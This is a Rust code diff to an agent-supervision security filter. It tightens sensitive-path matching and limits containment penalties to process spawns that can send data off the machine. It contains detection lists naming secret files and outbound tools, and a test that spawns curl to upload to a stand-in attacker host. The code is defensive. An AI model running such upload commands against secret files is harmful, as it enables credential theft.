@@ -42,7 +42,6 @@ impl Default for SessionContainmentConfig {
                 "passwd".into(),
                 "shadow".into(),
                 "keychain".into(),
-                "sam".into(),
             ],
             outbound_command_tokens: vec![
                 "curl ".into(),
@@ -175,9 +174,41 @@ impl SessionContainmentFilter {
 
     fn is_sensitive_source(&self, path: &str) -> bool {
         let lowered = path.to_lowercase();
-        self.sensitive_sources
-            .iter()
-            .any(|needle| lowered.contains(needle))
+        let basename = lowered.rsplit('/').next().unwrap_or("");
+        // Match on path SEGMENTS / basename, NOT arbitrary substrings. A bare
+        // `contains` armed containment on any path that merely embedded a token
+        // — e.g. the source file `secret_scan.rs` (matched "secrets" loosely),
+        // a dep dir like `sample-1.2` (matched "sam"), or any path containing
+        // "credentials". Supervising a build of a security-tooling tree (grith
+        // itself) thus armed containment on a routine read, after which every
+        // ProcessSpawn scored +process_score for the whole window and flooded
+        // prompts. A needle now matches only when:
+        //   - it contains '/' (e.g. ".kube/config"): a path suffix on a '/'
+        //     boundary;
+        //   - it equals a path segment (sensitive dirs like `.ssh`/`.aws`, and
+        //     sensitive basenames like `id_rsa`/`credentials`); or
+        //   - it is a dotfile prefix of the basename (`.env` -> `.env.local`).
+        // Basename stem = the part before the first '.', so `secrets.yaml` /
+        // `credentials.json` match (stem "secrets" / "credentials") but
+        // `secret_scan.rs` / `credentials_helper.rs` do not (stems
+        // "secret_scan" / "credentials_helper").
+        let stem = basename.split('.').next().unwrap_or(basename);
+        self.sensitive_sources.iter().any(|needle| {
+            if needle.contains('/') {
+                // Multi-component (e.g. ".kube/config"): path suffix on a '/'.
+                lowered == *needle || lowered.ends_with(&format!("/{needle}"))
+            } else if needle.starts_with('.') {
+                // Dotfile dir/file (.ssh, .aws, .env): segment match, or a
+                // basename variant (`.env` -> `.env.local`).
+                lowered.split('/').any(|seg| seg == needle.as_str())
+                    || basename.starts_with(needle.as_str())
+            } else {
+                // Plain token: a full path segment (sensitive dir like
+                // `secrets/`, or extensionless secret file like `credentials`)
+                // OR the basename stem.
+                lowered.split('/').any(|seg| seg == needle.as_str()) || stem == needle.as_str()
+            }
+        })
     }
 
     fn looks_outbound_command(&self, command: &str) -> bool {
@@ -185,6 +216,25 @@ impl SessionContainmentFilter {
         self.outbound_command_tokens
             .iter()
             .any(|needle| lowered.contains(needle))
+    }
+
+    /// Whether a `ProcessSpawn` can move data off the machine, and is therefore
+    /// worth containment scrutiny. Containment exists to catch *exfil*, not to
+    /// block routine local execution — penalising every spawn flooded the
+    /// operator with prompts when a contained session ran a build (hundreds of
+    /// `rustc`/`ld.mold`/test-binary spawns, none of which can leave the host).
+    /// Mirrors the existing `ShellExec` gating (outbound-only).
+    ///
+    /// Prefers the supervisor-computed `SpawnProvenance.is_outbound_capable`
+    /// (PR 2's curated registry applied to the canonical path). On the LLM path,
+    /// where provenance isn't attached, falls back to the same outbound-token
+    /// heuristic used for shell commands.
+    fn spawn_is_outbound_capable(&self, ctx: &ToolCallContext) -> bool {
+        if let Some(prov) = &ctx.spawn_provenance {
+            return prov.is_outbound_capable;
+        }
+        ctx.full_command()
+            .is_some_and(|cmd| self.looks_outbound_command(&cmd))
     }
 
     fn evaluate_at(
@@ -222,16 +272,20 @@ impl SessionContainmentFilter {
                     mk_message("network egress"),
                 )
             }
-            ToolCallType::ProcessSpawn { .. } => {
+            ToolCallType::ProcessSpawn { .. } if self.spawn_is_outbound_capable(ctx) => {
                 let severity = severity_for(self.process_score);
                 FilterResult::matched(
                     "session_containment",
                     "contained-process-egress",
                     self.process_score,
                     severity,
-                    mk_message("process spawn"),
+                    mk_message("outbound-capable process spawn"),
                 )
             }
+            // Routine local spawn (compiler, linker, test binary, …) under
+            // containment: it cannot exfil, so don't penalise it. This is the
+            // fix for the prompt flood when a contained session runs a build.
+            ToolCallType::ProcessSpawn { .. } => FilterResult::no_match("session_containment"),
             ToolCallType::ShellExec { .. } => match ctx.full_command() {
                 Some(full) if self.looks_outbound_command(&full) => {
                     let severity = severity_for(self.shell_score);
@@ -281,6 +335,119 @@ mod tests {
 
     fn make_ctx(session_id: Uuid, call_type: ToolCallType) -> ToolCallContext {
         ToolCallContext::new("test", call_type, session_id)
+    }
+
+    #[test]
+    fn is_sensitive_source_matches_real_secrets_not_embedded_tokens() {
+        let (filter, _t) = SessionContainmentFilter::with_defaults();
+        // Real secret locations → must arm containment.
+        for p in [
+            "/home/u/.ssh/id_rsa",
+            "/home/u/.aws/credentials",
+            "/home/u/project/.env",
+            "/home/u/project/.env.local",
+            "/home/u/.kube/config",
+            "/home/u/.gnupg/secring.gpg",
+            "/etc/shadow",
+            "/home/u/app/secrets.yaml",     // stem "secrets"
+            "/home/u/app/credentials.json", // stem "credentials"
+            "/home/u/k8s/secrets/db",       // "secrets" dir segment
+        ] {
+            assert!(filter.is_sensitive_source(p), "should arm on {p}");
+        }
+        // Paths that merely EMBED a token (the flood source) → must NOT arm.
+        for p in [
+            "/home/u/grith/crates/grith-proxy/src/filters/secret_scan.rs",
+            "/home/u/grith/crates/grith-core/src/credentials_helper.rs",
+            "/home/u/.cargo/registry/src/idx/sample-1.2.0/src/lib.rs",
+            "/home/u/grith/target/debug/deps/sign_profiles-90c7a42aee726d3d",
+            "/home/u/grith/docs/secrets-design.md",
+        ] {
+            assert!(!filter.is_sensitive_source(p), "must NOT arm on {p}");
+        }
+    }
+
+    fn provenance(is_outbound_capable: bool) -> crate::types::SpawnProvenance {
+        crate::types::SpawnProvenance {
+            canonical_path: "/x".into(),
+            sha256: String::new(),
+            owner_uid: 0,
+            owner_gid: 0,
+            mode: 0,
+            component_writability: vec![],
+            matched_routine_root: None,
+            is_outbound_capable,
+        }
+    }
+
+    // Arm containment, then assert ProcessSpawn is penalised ONLY when the
+    // spawn is outbound-capable — the fix for the build-spawn prompt flood.
+    #[tokio::test]
+    async fn contained_process_spawn_penalised_only_when_outbound() {
+        let (filter, _t) = SessionContainmentFilter::with_defaults();
+        let sid = Uuid::new_v4();
+        let now = Instant::now();
+        // Arm via a real sensitive read.
+        let _ = filter
+            .evaluate_at(
+                &make_ctx(
+                    sid,
+                    ToolCallType::FileRead {
+                        path: "/home/u/.ssh/id_rsa".into(),
+                    },
+                ),
+                now,
+            )
+            .unwrap();
+        let later = now + Duration::from_secs(1);
+
+        // (1) Routine local spawn, no provenance, no outbound token → exempt.
+        let routine = make_ctx(
+            sid,
+            ToolCallType::ProcessSpawn {
+                command: "/home/u/grith/target/debug/deps/sign_profiles-90c7".into(),
+                args: vec![],
+            },
+        );
+        assert!(
+            !filter.evaluate_at(&routine, later).unwrap().matched,
+            "routine local spawn must NOT be contained"
+        );
+
+        // (2) Outbound spawn via fallback token (no provenance) → contained.
+        let curl = make_ctx(
+            sid,
+            ToolCallType::ProcessSpawn {
+                command: "curl".into(),
+                args: vec!["https://evil.example/upload".into()],
+            },
+        );
+        assert!(
+            filter.evaluate_at(&curl, later).unwrap().matched,
+            "outbound spawn must be contained"
+        );
+
+        // (3) Provenance flag is authoritative: not-outbound → exempt even for
+        // a scary-looking path; outbound → contained.
+        let mut prov_routine = make_ctx(
+            sid,
+            ToolCallType::ProcessSpawn {
+                command: "/usr/bin/rustc".into(),
+                args: vec![],
+            },
+        );
+        prov_routine.spawn_provenance = Some(provenance(false));
+        assert!(!filter.evaluate_at(&prov_routine, later).unwrap().matched);
+
+        let mut prov_outbound = make_ctx(
+            sid,
+            ToolCallType::ProcessSpawn {
+                command: "/usr/bin/curl".into(),
+                args: vec![],
+            },
+        );
+        prov_outbound.spawn_provenance = Some(provenance(true));
+        assert!(filter.evaluate_at(&prov_outbound, later).unwrap().matched);
     }
 
     #[tokio::test]
